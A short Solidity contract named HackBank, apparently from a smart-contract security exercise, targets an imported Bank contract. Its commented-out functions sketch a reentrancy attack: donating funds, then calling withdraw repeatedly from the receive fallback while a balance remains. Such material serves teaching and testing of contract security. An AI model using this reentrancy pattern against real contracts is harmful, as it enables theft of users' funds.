// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./Bank.sol";

contract HackBank {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    // function hackContract() external {
    //     Bank(contractAddress).donate{value: address(this).balance}(
    //         address(this)
    //     );
    //     Bank(contractAddress).withdraw();
    // }

    // receive() external payable {
    //     if (Bank(contractAddress).balanceOf(address(this)) > 0) {
    //         Bank(contractAddress).withdraw();
    //     }
    // }
}
